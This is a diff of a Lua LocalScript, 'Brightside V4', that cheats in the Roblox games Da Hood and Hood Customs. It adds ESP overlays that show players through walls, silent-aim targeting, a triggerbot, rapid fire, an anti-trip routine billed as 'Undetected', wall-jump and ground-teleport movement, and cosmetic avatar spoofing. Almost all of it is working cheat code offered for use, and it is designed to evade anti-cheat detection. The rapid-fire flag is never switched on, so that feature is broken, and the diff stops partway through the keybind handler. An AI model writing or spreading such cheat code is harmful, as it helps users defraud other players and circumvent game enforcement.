@@ -1,157 +1,161 @@
--- Name: Brightside V4 - Fixed Target Checks (PERFORMANCE OPTIMIZED)
--- Location of script: StarterPlayerScripts (as LocalScript)
+-- Name: Brightside V4 - Fixed Anti Trip
+-- Location of script: StarterGui (or appropriate location)
 -- Script Type: LocalScript
 
 -- ==========================================================
---  BRIGHTSIDE V4 - MINIMAL CHECKS, MAXIMUM PERFORMANCE
---  Fixed: Dead player ESP removal, target unlocking, no crashes
+--  BRIGHTSIDE V4 - FINAL SOURCE (SAFE ANTI TRIP FIX)
+--  Fixed: Safe Anti Trip (Undetected), Fast Triggerbot, Mouse Cursor Targeting
+--  Features: Spiderman, Korblox, Headless, Panic Ground, Rapid Fire
+--  Games: Da Hood (2788229376), Hood Customs (9825515356)
 -- ==========================================================
 
--- Cache services (DO NOT cache Camera globally)
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local Workspace = game:GetService("Workspace")
-local LocalPlayer = Players.LocalPlayer
-local Mouse = LocalPlayer:GetMouse()
+local Players           = game:GetService("Players")
+local RunService        = game:GetService("RunService")
+local UserInputService  = game:GetService("UserInputService")
+local Workspace         = game:GetService("Workspace")
+local LocalPlayer       = Players.LocalPlayer
+local Camera            = Workspace.CurrentCamera
+local Mouse             = LocalPlayer:GetMouse()
 
 -- ==========================================================
---  CONFIG (Minimal fallbacks - no deep nesting)
+--  CONFIG ACCESS
 -- ==========================================================
 local Surge = getgenv().Surge
-if not Surge then
-    warn("Surge config not found!")
-    return
-end
 
 -- ==========================================================
---  STATE (Minimal variables)
+--  STATE VARIABLES
 -- ==========================================================
 local ESPCache = {}
 local LockedTarget = nil
 local CurrentTarget = nil
-local ESPEnabled = Surge.RaidAwareness and Surge.RaidAwareness.Enabled or false
+local ESPEnabled = Surge['Raid Awareness']['Enabled']
 local TriggerbotActive = false
 local LastShot = 0
+local RapidFireActive = false
+local RapidFireLastFire = 0
 
--- Caches
-local lastCharUpdate = 0
-local localHRP = nil
-local playerCache = {}
-local lastPlayerCache = 0
-
--- ==========================================================
---  Performance: Direct config access (no deep copies)
--- ==========================================================
-local function getFOV()
-    return Surge.SilentAimbot and Surge.SilentAimbot.FOV and Surge.SilentAimbot.FOV['Circle Value'] or 150
-end
-
-local function getTargetColor()
-    return Surge.Target and Surge.Target.Color or Color3.fromRGB(0, 255, 0)
-end
-
-local function shouldUseVisibleCheck()
-    return Surge.Target and Surge.Target.VisibleCheck or false
-end
-
-local function shouldUnlockOnDeath()
-    return Surge.Target and Surge.Target.Unlock and Surge.Target.Unlock.Knocked or true
-end
-
-local function shouldUnlockOnGrabbed()
-    return Surge.Target and Surge.Target.Unlock and Surge.Target.Unlock.Grabbed or true
-end
-
-local function getMaxRenderDistance()
-    return Surge.RaidAwareness and Surge.RaidAwareness['Max Render Distance'] or 1000
-end
-
-local function isBoxEnabled()
-    return Surge.RaidAwareness and Surge.RaidAwareness.Box and Surge.RaidAwareness.Box.Enabled or false
-end
-
-local function isNameEnabled()
-    return Surge.RaidAwareness and Surge.RaidAwareness.Name and Surge.RaidAwareness.Name.Enabled or false
-end
-
-local function isTracerEnabled()
-    return Surge.RaidAwareness and Surge.RaidAwareness.Tracer and Surge.RaidAwareness.Tracer.Enabled or false
-end
-
-local function isDistanceEnabled()
-    return Surge.RaidAwareness and Surge.RaidAwareness.Distance and Surge.RaidAwareness.Distance.Enabled or false
-end
-
-local function getNameType()
-    return Surge.RaidAwareness and Surge.RaidAwareness.Name and Surge.RaidAwareness.Name.Type or 'Display'
-end
+-- ANTI TRIP STATE (Optimized)
+local lastAntiTripTime = 0
+local lastStableTime = 0
 
 -- ==========================================================
---  CACHING (Optimized)
+--  GAME DETECTION
 -- ==========================================================
-local function updateCachedChar()
-    local now = tick()
-    if now - lastCharUpdate > 0.1 then
-        local char = LocalPlayer.Character
-        if char then
-            localHRP = char:FindFirstChild("HumanoidRootPart")
-        else
-            localHRP = nil
+local placeId = game.PlaceId
+local isDaHood = (placeId == 2788229376)
+local isHoodCustoms = (placeId == 9825515356)
+local isDaHoodGame = isDaHood or isHoodCustoms
+
+-- ==========================================================
+--  RAPID FIRE SYSTEM (Optimized)
+-- ==========================================================
+local utility = {}
+local get_gun = function()
+    local char = LocalPlayer.Character
+    if not char then return nil end
+    for _, tool in next, char:GetChildren() do
+        if tool:IsA("Tool") and tool:FindFirstChild("Ammo") then 
+            return tool 
         end
-        lastCharUpdate = now
     end
-    return localHRP
+    return nil
 end
 
-local function getCachedPlayers()
-    local now = tick()
-    if now - lastPlayerCache > 0.5 then
-        playerCache = Players:GetPlayers()
-        lastPlayerCache = now
+UserInputService.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1 then
+        local gun = get_gun()
+        if Surge['Player Modification']['Rapid Fire']['Enabled'] and gun then
+            local rapidDelay = Surge['Player Modification']['Rapid Fire']['Delay'] or 0.05
+            local fireRapid = function()
+                while RapidFireActive and gun and gun.Parent do
+                    pcall(function()
+                        gun:Activate()
+                    end)
+                    task.wait(rapidDelay)
+                end
+            end
+            task.spawn(fireRapid)
+        end
     end
-    return playerCache
-end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        RapidFireActive = false
+    end
+end)
 
 -- ==========================================================
---  TARGET CHECKS (Simplified - NO NIL ERRORS)
+--  UTILITY FUNCTIONS
 -- ==========================================================
-local function shouldUnlockTarget(target)
-    if not target or not target.Character then return true end
+local function getKeyCodeFromString(keyName)
+    if not keyName or type(keyName) ~= "string" then return nil end
+    local upperKeyName = keyName:upper()
     
-    local char = target.Character
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return true end
+    local success, keyCode = pcall(function()
+        return Enum.KeyCode[upperKeyName]
+    end)
     
-    -- DEATH CHECK
-    if shouldUnlockOnDeath() and hum.Health <= 0 then
-        return true
-    end
+    if success and keyCode then return keyCode end
     
-    -- GRAB CHECK
-    if shouldUnlockOnGrabbed() then
-        if char:FindFirstChild("GRABBING_CONSTRAINT") or hum.PlatformStand then
-            return true
+    if upperKeyName:match("^F%d+$") then
+        local fKeyNum = tonumber(upperKeyName:sub(2))
+        if fKeyNum and fKeyNum >= 1 and fKeyNum <= 24 then
+            success, keyCode = pcall(function()
+                return Enum.KeyCode["F" .. fKeyNum]
+            end)
+            if success and keyCode then return keyCode end
         end
     end
     
-    return false
+    return nil
+end
+
+-- ==========================================================
+--  MOUSE CURSOR TARGETING (Optimized)
+-- ==========================================================
+local function getTargetFromCursor()
+    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
+    local closestPlayer = nil
+    local closestDist = math.huge
+    local fov = Surge['Silent Aimbot']['FOV']['Circle Value'] or 150
+    fov = fov * fov -- Compare squared distances for performance
+    
+    for _, player in pairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+        
+        local char = player.Character
+        if not char then continue end
+        
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then continue end
+        
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum or hum.Health <= 0 then continue end
+        
+        local screenPos, onScreen = Camera:WorldToViewportPoint(hrp.Position)
+        if not onScreen or screenPos.Z <= 0 then continue end
+        
+        local diff = Vector2.new(screenPos.X, screenPos.Y) - mousePos
+        local distSq = diff.X * diff.X + diff.Y * diff.Y
+        
+        if distSq < closestDist and distSq <= fov then
+            closestDist = distSq
+            closestPlayer = player
+        end
+    end
+    
+    return closestPlayer, math.sqrt(closestDist)
 end
 
 local function isVisible(target)
-    if not shouldUseVisibleCheck() then return true end
+    if not Surge['Target']['Visible Check'] then return true end
     if not target or not target.Character then return false end
     
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return false end
     
-    local myHRP = updateCachedChar()
-    if not myHRP then return false end
-    
-    local cam = Workspace.CurrentCamera
-    if not cam then return false end
-    
-    local origin = cam.CFrame.Position
+    local origin = Camera.CFrame.Position
     local direction = (hrp.Position - origin)
     local raycastParams = RaycastParams.new()
     raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
@@ -164,75 +168,56 @@ local function isVisible(target)
     return true
 end
 
-local function getTargetFromCursor()
-    local cam = Workspace.CurrentCamera
-    if not cam then return nil end
+local function shouldUnlockTarget(target)
+    if not target or not target.Character then return true end
+    local char = target.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
     
-    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
-    local closest = nil
-    local closestDist = math.huge
-    local fov = getFOV()
-    
-    for _, player in ipairs(getCachedPlayers()) do
-        if player ~= LocalPlayer then
-            local char = player.Character
-            if char then
-                local hrp = char:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    local hum = char:FindFirstChildOfClass("Humanoid")
-                    if hum and hum.Health > 0 then
-                        local pos, onScreen = cam:WorldToViewportPoint(hrp.Position)
-                        if onScreen and pos.Z > 0 then
-                            local dist = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
-                            if dist < closestDist and dist <= fov then
-                                closestDist = dist
-                                closest = player
-                            end
-                        end
-                    end
-                end
-            end
-        end
+    if Surge['Target']['Unlock']['Knocked'] and hum and hum.Health <= 0 then
+        return true
     end
     
-    return closest
+    if Surge['Target']['Unlock']['Grabbed'] then
+        if char:FindFirstChild("GRABBING_CONSTRAINT") or 
+           (hum and hum.PlatformStand) then
+            return true
+        end
+    end
+    return false
 end
 
+-- ==========================================================
+--  TARGET SYSTEM (Optimized)
+-- ==========================================================
 local function getBestTarget()
-    local targetType = Surge.Target and Surge.Target.Type or "Automatic"
+    local targetType = Surge['Target']['Type'] or "Automatic"
     
-    -- Target mode: only locked target
     if targetType == "Target" then
         if LockedTarget then
             if shouldUnlockTarget(LockedTarget) then
                 LockedTarget = nil
                 return nil
             end
-            if shouldUseVisibleCheck() then
-                return isVisible(LockedTarget) and LockedTarget or nil
+            if isVisible(LockedTarget) then
+                return LockedTarget
             end
-            return LockedTarget
         end
         return nil
     end
     
-    -- Auto mode: check locked target first
     if LockedTarget and not shouldUnlockTarget(LockedTarget) then
         local char = LockedTarget.Character
         if char then
             local hrp = char:FindFirstChild("HumanoidRootPart")
             if hrp then
-                local cam = Workspace.CurrentCamera
-                if cam then
-                    local pos = cam:WorldToViewportPoint(hrp.Position)
-                    if pos.Z > 0 then
-                        local mousePos = Vector2.new(Mouse.X, Mouse.Y)
-                        local dist = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
-                        if dist <= getFOV() then
-                            if not shouldUseVisibleCheck() or isVisible(LockedTarget) then
-                                return LockedTarget
-                            end
-                        end
+                local screenPos = Camera:WorldToViewportPoint(hrp.Position)
+                if screenPos.Z > 0 then
+                    local mousePos = Vector2.new(Mouse.X, Mouse.Y)
+                    local diff = Vector2.new(screenPos.X, screenPos.Y) - mousePos
+                    local distSq = diff.X * diff.X + diff.Y * diff.Y
+                    local fov = Surge['Silent Aimbot']['FOV']['Circle Value'] or 150
+                    if distSq <= fov * fov and isVisible(LockedTarget) then
+                        return LockedTarget
                     end
                 end
             end
@@ -240,41 +225,34 @@ local function getBestTarget()
         LockedTarget = nil
     end
     
-    -- Cursor targeting
     return getTargetFromCursor()
 end
 
 -- ==========================================================
---  ESP SYSTEM (Simplified)
+--  ESP FUNCTIONS (Optimized)
 -- ==========================================================
 local function CreateESP(player)
     if ESPCache[player] then return ESPCache[player] end
-    
     local d = {
         Name = Drawing.new("Text"),
-        Box = Drawing.new("Square"),
+        Box  = Drawing.new("Square"),
         BoxOutline = Drawing.new("Square"),
         Tracer = Drawing.new("Line"),
         Distance = Drawing.new("Text")
     }
-    
     d.Name.Size = 14; d.Name.Center = true; d.Name.Outline = true
     d.Box.Thickness = 1; d.Box.Filled = false
     d.BoxOutline.Thickness = 3; d.BoxOutline.Filled = false; d.BoxOutline.Color = Color3.new(0,0,0)
     d.Tracer.Thickness = 1
     d.Distance.Size = 12; d.Distance.Center = true; d.Distance.Outline = true
-    
     ESPCache[player] = d
     return d
 end
 
 local function RemoveESP(player)
-    local d = ESPCache[player]
-    if d then
-        for _, obj in pairs(d) do
-            if obj and obj.Remove then
-                obj:Remove()
-            end
+    if ESPCache[player] then
+        for _, dr in pairs(ESPCache[player]) do 
+            dr:Remove() 
         end
         ESPCache[player] = nil
     end
@@ -282,142 +260,128 @@ end
 
 local function UpdateESP()
     if not ESPEnabled then
-        for _, d in pairs(ESPCache) do
-            for _, obj in pairs(d) do
-                if obj and obj.Visible ~= nil then
-                    obj.Visible = false
-                end
-            end
+        for _, drawings in pairs(ESPCache) do
+            for _, dr in pairs(drawings) do dr.Visible = false end
         end
         return
     end
     
-    local cam = Workspace.CurrentCamera
-    if not cam then return end
+    local maxDist = Surge['Raid Awareness']['Max Render Distance'] or 1000
+    maxDist = maxDist * maxDist -- Use squared distance
+    local localHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local localPos = localHRP and localHRP.Position
+    local viewportSize = Camera.ViewportSize
+    local targetColor = Surge['Target']['Color'] or Color3.fromRGB(0, 255, 0)
+    local boxOtherColor = Surge['Raid Awareness']['Box']['Other Color']
+    local nameOtherColor = Surge['Raid Awareness']['Name']['Other Color']
+    local tracerOtherColor = Surge['Raid Awareness']['Tracer']['Other Color']
+    local distanceOtherColor = Surge['Raid Awareness']['Distance']['Other Color']
     
-    local myHRP = updateCachedChar()
-    local maxDist = getMaxRenderDistance()
-    local targetColor = getTargetColor()
-    local boxOtherColor = Surge.RaidAwareness.Box and Surge.RaidAwareness.Box.OtherColor or Color3.fromRGB(255,255,255)
-    local nameOtherColor = Surge.RaidAwareness.Name and Surge.RaidAwareness.Name.OtherColor or Color3.fromRGB(255,255,255)
-    
-    for _, player in ipairs(getCachedPlayers()) do
-        if player ~= LocalPlayer then
-            local char = player.Character
-            if not char then
+    for _, player in pairs(Players:GetPlayers()) do
+        if player == LocalPlayer then continue end
+        
+        local char = player.Character
+        if not char then 
+            RemoveESP(player)
+            continue 
+        end
+        
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        
+        if not hrp or not hum or hum.Health <= 0 then 
+            RemoveESP(player)
+            continue 
+        end
+        
+        if localPos then
+            local distSq = (hrp.Position - localPos).Magnitude^2
+            if distSq > maxDist then 
                 RemoveESP(player)
-                goto continue
+                continue 
             end
-            
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            local hum = char:FindFirstChildOfClass("Humanoid")
-            
-            -- CRITICAL FIX: Remove ESP for dead players
-            if not hrp or not hum or hum.Health <= 0 then
-                RemoveESP(player)
-                goto continue
+        end
+        
+        local feetPos = hrp.Position - Vector3.new(0,3,0)
+        local screenPos = Camera:WorldToViewportPoint(feetPos)
+        
+        if screenPos.Z <= 0 then
+            local drawings = ESPCache[player]
+            if drawings then 
+                for _, dr in pairs(drawings) do dr.Visible = false end 
             end
+            continue
+        end
+        
+        local drawings = CreateESP(player)
+        if not drawings then continue end
+        
+        local sp = Vector2.new(screenPos.X, screenPos.Y)
+        local isTarget = (player == CurrentTarget)
+        
+        local headPos = hrp.Position + Vector3.new(0,6,0)
+        local headScreen = Camera:WorldToViewportPoint(headPos)
+        if headScreen.Z > 0 then
+            local headSp = Vector2.new(headScreen.X, headScreen.Y)
+            local h = math.abs(sp.Y - headSp.Y)
+            local w = h * 0.5
+            local boxPos = Vector2.new(sp.X - w/2, headSp.Y)
             
-            -- Distance check
-            if myHRP and (hrp.Position - myHRP.Position).Magnitude > maxDist then
-                RemoveESP(player)
-                goto continue
-            end
-            
-            local feetPos = hrp.Position - Vector3.new(0, 3, 0)
-            local pos = cam:WorldToViewportPoint(feetPos)
-            
-            if pos.Z <= 0 then
-                local d = ESPCache[player]
-                if d then
-                    for _, obj in pairs(d) do
-                        if obj and obj.Visible ~= nil then
-                            obj.Visible = false
-                        end
-                    end
-                end
-                goto continue
-            end
-            
-            local d = CreateESP(player)
-            if not d then goto continue end
-            
-            local sp = Vector2.new(pos.X, pos.Y)
-            local isTarget = (player == CurrentTarget)
-            
-            -- BOX
-            if isBoxEnabled() then
-                local headPos = hrp.Position + Vector3.new(0, 6, 0)
-                local headPos2D = cam:WorldToViewportPoint(headPos)
-                if headPos2D.Z > 0 then
-                    local headSp = Vector2.new(headPos2D.X, headPos2D.Y)
-                    local h = math.abs(sp.Y - headSp.Y)
-                    local w = h * 0.5
-                    local boxPos = Vector2.new(sp.X - w/2, headSp.Y)
-                    
-                    d.BoxOutline.Size = Vector2.new(w + 4, h + 4)
-                    d.BoxOutline.Position = Vector2.new(boxPos.X - 2, boxPos.Y - 2)
-                    d.BoxOutline.Visible = true
-                    d.Box.Size = Vector2.new(w, h)
-                    d.Box.Position = boxPos
-                    d.Box.Color = isTarget and targetColor or boxOtherColor
-                    d.Box.Visible = true
-                else
-                    d.BoxOutline.Visible = false
-                    d.Box.Visible = false
-                end
+            if Surge['Raid Awareness']['Box']['Enabled'] then
+                drawings.BoxOutline.Size = Vector2.new(w+4, h+4)
+                drawings.BoxOutline.Position = Vector2.new(boxPos.X-2, boxPos.Y-2)
+                drawings.BoxOutline.Visible = true
+                drawings.Box.Size = Vector2.new(w,h)
+                drawings.Box.Position = boxPos
+                drawings.Box.Color = isTarget and targetColor or boxOtherColor
+                drawings.Box.Visible = true
             else
-                d.BoxOutline.Visible = false
-                d.Box.Visible = false
+                drawings.BoxOutline.Visible = false
+                drawings.Box.Visible = false
             end
-            
-            -- NAME
-            if isNameEnabled() then
-                d.Name.Text = getNameType() == 'Display' and player.DisplayName or player.Name
-                d.Name.Position = Vector2.new(sp.X, sp.Y + 10)
-                d.Name.Color = isTarget and targetColor or nameOtherColor
-                d.Name.Visible = true
-            else
-                d.Name.Visible = false
-            end
-            
-            -- TRACER
-            if isTracerEnabled() then
-                d.Tracer.From = Vector2.new(sp.X, cam.ViewportSize.Y)
-                d.Tracer.To = sp
-                d.Tracer.Color = isTarget and targetColor or (Surge.RaidAwareness.Tracer and Surge.RaidAwareness.Tracer.OtherColor or Color3.fromRGB(255,255,255))
-                d.Tracer.Visible = true
-            else
-                d.Tracer.Visible = false
-            end
-            
-            -- DISTANCE
-            if isDistanceEnabled() and myHRP then
-                local dist = (hrp.Position - myHRP.Position).Magnitude
-                d.Distance.Text = math.floor(dist) .. " studs"
-                d.Distance.Position = Vector2.new(sp.X, sp.Y + 25)
-                d.Distance.Color = isTarget and targetColor or (Surge.RaidAwareness.Distance and Surge.RaidAwareness.Distance.OtherColor or Color3.fromRGB(255,255,255))
-                d.Distance.Visible = true
-            else
-                d.Distance.Visible = false
-            end
-            
-            ::continue::
+        end
+        
+        if Surge['Raid Awareness']['Name']['Enabled'] then
+            local t = Surge['Raid Awareness']['Name']['Type'] or 'Display'
+            drawings.Name.Text = t == 'Display' and player.DisplayName or player.Name
+            drawings.Name.Position = Vector2.new(sp.X, sp.Y + 10)
+            drawings.Name.Color = isTarget and targetColor or nameOtherColor
+            drawings.Name.Visible = true
+        else
+            drawings.Name.Visible = false
+        end
+        
+        if Surge['Raid Awareness']['Tracer']['Enabled'] then
+            drawings.Tracer.From = Vector2.new(sp.X, viewportSize.Y)
+            drawings.Tracer.To = sp
+            drawings.Tracer.Color = isTarget and targetColor or tracerOtherColor
+            drawings.Tracer.Visible = true
+        else
+            drawings.Tracer.Visible = false
+        end
+        
+        if Surge['Raid Awareness']['Distance']['Enabled'] and localHRP then
+            local d = (hrp.Position - localPos).Magnitude
+            drawings.Distance.Text = math.floor(d) .. " studs"
+            drawings.Distance.Position = Vector2.new(sp.X, sp.Y + 25)
+            drawings.Distance.Color = isTarget and targetColor or distanceOtherColor
+            drawings.Distance.Visible = true
+        else
+            drawings.Distance.Visible = false
         end
     end
 end
 
 -- ==========================================================
---  Triggerbot (Minimal)
+--  TRIGGERBOT SYSTEM (FAST)
 -- ==========================================================
 local function performTriggerbot()
-    if not TriggerbotActive or not Surge.Triggerbot or not Surge.Triggerbot.Enabled then return end
-    
-    local cam = Workspace.CurrentCamera
-    if not cam then return end
+    if not TriggerbotActive then return end
+    if not Surge['Triggerbot']['Enabled'] then return end
     
     local target = nil
-    if Surge.Triggerbot.Type == "Target" then
+    
+    if Surge['Target']['Type'] == "Target" then
         if LockedTarget and not shouldUnlockTarget(LockedTarget) then
             target = LockedTarget
         end
@@ -428,156 +392,440 @@ local function performTriggerbot()
     if not target or not target.Character then return end
     
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
-    local hum = target.Character:FindFirstChildOfClass("Humanoid")
-    if not hrp or not hum or hum.Health <= 0 then return end
+    if not hrp then return end
     
     local mousePos = Vector2.new(Mouse.X, Mouse.Y)
-    local pos = cam:WorldToViewportPoint(hrp.Position)
+    local pos = Camera:WorldToViewportPoint(hrp.Position)
+    
     if pos.Z <= 0 then return end
     
-    local dist = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
-    local threshold = Surge.Triggerbot.ShootMode == 'Hitbox' and 15 or (Surge.Triggerbot.FOV and Surge.Triggerbot.FOV['Circle Value'] or 45)
-    if dist > threshold then return end
+    local diff = Vector2.new(pos.X, pos.Y) - mousePos
+    local distSq = diff.X * diff.X + diff.Y * diff.Y
+    local threshold = Surge['Triggerbot']['Shoot Mode'] == 'Hitbox' and 225 or ((Surge['Triggerbot']['FOV']['Circle Value'] or 45) ^ 2)
     
+    if distSq > threshold then return end
+    
+    local cooldown = Surge['Triggerbot']['Timing']['Cooldown'] or 0.001
     local now = tick()
-    local cooldown = Surge.Triggerbot.Timing and Surge.Triggerbot.Timing.Cooldown or 0.001
     if now - LastShot < cooldown then return end
     
-    local myHRP = updateCachedChar()
-    if not myHRP then return end
-    
-    local tool = myHRP:FindFirstChildOfClass("Tool")
+    local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
     if tool then
-        tool:Activate()
-        LastShot = now
+        pcall(function()
+            tool:Activate()
+            LastShot = now
+        end)
     end
 end
 
 -- ==========================================================
---  ANTI TRIP (Simple, no pcall overhead)
+--  ANTI TRIP SYSTEM (SAFE - FIXED)
 -- ==========================================================
 local function performAntiTrip()
-    if not Surge.AntiTrip or not Surge.AntiTrip.Enabled then return end
+    if not Surge['Anti Trip']['Enabled'] then return end
+    
+    local now = tick()
+    if now - lastAntiTripTime < 0.05 then return end -- Faster response (50ms)
+    lastAntiTripTime = now
     
     local char = LocalPlayer.Character
     if not char then return end
     
     local hum = char:FindFirstChildOfClass("Humanoid")
     local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hum or not hrp or hum.Health <= 0 then return end
+    if not hum or not hrp then return end
     
-    -- Check if tripped
-    local isTripped = false
-    
-    if hum.PlatformStand then
-        isTripped = true
-    else
-        local state = hum:GetState()
-        if state == Enum.HumanoidStateType.FallingDown or 
-           state == Enum.HumanoidStateType.Ragdoll or
-           state == Enum.HumanoidStateType.Seated then
-            isTripped = true
-        end
+    -- Check if tripped (PlatformStand is primary indicator)
+    if not hum.PlatformStand then 
+        lastStableTime = now -- Track when last stable
+        return 
     end
     
-    if not isTripped then return end
+    -- If recently stable, give server time (prevents rapid toggling)
+    if now - lastStableTime < 0.5 then return end
     
-    -- Fix it
-    hum.PlatformStand = false
-    hum:ChangeState(Enum.HumanoidStateType.Running)
+    -- SAFE: Only disable PlatformStand
+    pcall(function()
+        hum.PlatformStand = false
+    end)
     
+    -- Optional: Subtle velocity control (prevents immediate fall)
     local vel = hrp.AssemblyLinearVelocity
     if vel.Magnitude > 30 then
-        hrp.AssemblyLinearVelocity = Vector3.new(vel.X * 0.3, math.max(vel.Y, -5), vel.Z * 0.3)
-    end
-    if vel.Y < -15 then
-        hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity + Vector3.new(0, 10, 0)
+        hrp.AssemblyLinearVelocity = vel.Unit * 30
     end
 end
 
 -- ==========================================================
---  Keybinds (Simplified)
+--  SPIDERMAN WALL JUMP SYSTEM
 -- ==========================================================
-local Keybinds = Surge.Main and Surge.Main.Keybinds or {}
+local function getWallNormal()
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+    
+    local wallDist = Surge.Spiderman['Wall Distance'] or 7
+    local params = RaycastParams.new()
+    params.FilterDescendantsInstances = {char}
+    params.FilterType = Enum.RaycastFilterType.Blacklist
+    
+    local heights = {Vector3.new(0, -2, 0), Vector3.new(0, 0, 0), Vector3.new(0, 2, 0)}
+    local dirs = {
+        hrp.CFrame.LookVector, 
+        -hrp.CFrame.LookVector, 
+        hrp.CFrame.RightVector, 
+        -hrp.CFrame.RightVector
+    }
+    
+    for _, h in ipairs(heights) do
+        for _, d in ipairs(dirs) do
+            local res = Workspace:Raycast(hrp.Position + h, d * wallDist, params)
+            if res and res.Instance.CanCollide then 
+                return res.Normal 
+            end
+        end
+    end
+    return nil
+end
+
+local LastWallJumpTime = 0
+local JumpCount = 0
+local LastJumpTime = 0
+
+local function performWallJump()
+    if not Surge.Spiderman.Enabled then return end
+    
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp or tick() - LastWallJumpTime < (Surge.Spiderman.Cooldown or 0.2) then 
+        return 
+    end
+    
+    local wallNormal = getWallNormal()
+    if not wallNormal then return end
+    
+    local tool = char:FindFirstChildOfClass("Tool")
+    local isKnife = tool and tool.Name:lower():match("knife")
+    local power = isKnife and Surge.Spiderman['Knife Jump Power'] or Surge.Spiderman['Jump Power']
+    
+    -- Reduce current horizontal velocity
+    hrp.AssemblyLinearVelocity = Vector3.new(
+        hrp.AssemblyLinearVelocity.X * 0.2, 
+        0, 
+        hrp.AssemblyLinearVelocity.Z * 0.2
+    )
+    
+    task.wait(0.01)
+    
+    -- Apply jump force
+    local jumpDirection = (Vector3.new(0, 1.45, 0) + wallNormal * 0.35).Unit
+    hrp.AssemblyLinearVelocity = jumpDirection * (power * 1.35)
+    LastWallJumpTime = tick()
+end
+
+-- ==========================================================
+--  KORBLOX SYSTEM
+-- ==========================================================
+local function applyKorblox()
+    if not Surge.Extra.Korblox then return end
+    
+    local char = LocalPlayer.Character
+    if not char then return end
+    if char:FindFirstChild("KorbloxVisual") then return end
+    
+    local rightLeg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightLowerLeg")
+    if not rightLeg then return end
+    
+    local partsToHide = {"Right Leg", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
+    for _, name in ipairs(partsToHide) do
+        local part = char:FindFirstChild(name)
+        if part and part:IsA("BasePart") then
+            part.Transparency = 1
+            for _, child in pairs(part:GetChildren()) do
+                if child:IsA("Decal") or child:IsA("Texture") then
+                    child.Transparency = 1
+                end
+            end
+        end
+    end
+    
+    local korblox = Instance.new("Part")
+    korblox.Name = "KorbloxVisual"
+    korblox.Size = Vector3.new(1, 2, 1)
+    korblox.CanCollide = false
+    korblox.Transparency = 0
+    
+    local mesh = Instance.new("SpecialMesh")
+    mesh.MeshType = Enum.MeshType.FileMesh
+    mesh.MeshId = "rbxassetid://139607718"
+    mesh.TextureId = "rbxassetid://139607805"
+    mesh.Scale = Vector3.new(1.05, 1.05, 1.05)
+    mesh.Parent = korblox
+    
+    local weld = Instance.new("Weld")
+    weld.Part0 = rightLeg
+    weld.Part1 = korblox
+    weld.C0 = CFrame.new(0, 0, 0)
+    weld.C1 = CFrame.new(0, 0, 0)
+    weld.Parent = korblox
+    
+    korblox.Parent = char
+end
+
+-- ==========================================================
+--  HEADLESS SYSTEM
+-- ==========================================================
+local function applyHeadless()
+    if not Surge.Extra.Headless then return end
+    
+    local char = LocalPlayer.Character
+    if not char then return end
+    
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+    
+    head.Transparency = 1
+    for _, child in pairs(head:GetChildren()) do
+        if child:IsA("Decal") or child:IsA("Texture") then
+            child.Transparency = 1
+        end
+    end
+end
+
+-- ==========================================================
+--  PANIC GROUND SYSTEM
+-- ==========================================================
+local function performPanicGround()
+    if not Surge['Panic Ground']['Enabled'] then return end
+    
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    local params = RaycastParams.new()
+    params.FilterDescendantsInstances = {char, Workspace.CurrentCamera}
+    params.FilterType = Enum.RaycastFilterType.Blacklist
+    
+    local result = Workspace:Raycast(hrp.Position, Vector3.new(0, -5000, 0), params)
+    if result then
+        hrp.CFrame = CFrame.new(result.Position + Vector3.new(0, 3, 0))
+    end
+end
+
+-- ==========================================================
+--  KEYBIND HANDLER (Optimized)
+-- ==========================================================
+local Keybinds = Surge['Main']['Keybinds']
 
 UserInputService.InputBegan:Connect(function(input, processed)
     if processed then return end
     
-    -- Space for jump
-    if input.KeyCode == Enum.KeyCode.Space then
-        if Surge.Spiderman and Surge.Spiderman.Enabled then
-            local now = tick()
-            if now - LastJumpTime < 0.4 then
-                JumpCount = JumpCount + 1
-            else
-                JumpCount = 1
-            end
-            LastJumpTime = now
-            
-            if JumpCount >= 2 or not Surge.Spiderman.RequireDoubleJump then
-                -- Wall jump logic would go here (omitted for brevity)
+    local now = tick()
+    
+    -- ESP Toggle
+    local espKey = getKeyCodeFromString(Keybinds['ESP Toggle'] or 'T')
+    if espKey and input.KeyCode == espKey then
+        ESPEnabled = not ESPEnabled
+        if not ESPEnabled then
+            for _, drawings in pairs(ESPCache) do
+                for _, dr in pairs(drawings) do dr.Visible = false end
             end
         end
         return
     end
     
-    -- Check keybinds
-    for action, keyName in pairs(Keybinds) do
-        if type(keyName) == "string" then
-            local keyCode = Enum.KeyCode[keyName:upper()] or (keyName:match("^F(%d+)$") and Enum.KeyCode["F" .. keyName:sub(2)])
